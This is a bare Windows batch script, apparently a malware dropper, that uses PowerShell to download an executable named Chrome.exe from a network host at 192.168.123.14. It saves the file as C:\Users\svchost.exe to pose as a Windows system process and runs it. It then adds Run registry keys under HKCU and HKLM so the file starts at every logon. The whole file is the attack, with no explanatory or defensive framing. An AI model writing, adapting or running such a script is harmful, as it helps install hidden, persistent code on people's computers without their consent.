
powershell -Command "Invoke-WebRequest http://192.168.123.14/Chrome.exe -OutFile C:\Users\svchost.exe"

start C:\Users\svchost.exe

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v svchost /t REG_SZ /d C:\Users\svchost.exe /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v svchost /t REG_SZ /d C:\Users\svchost.exe /f


pause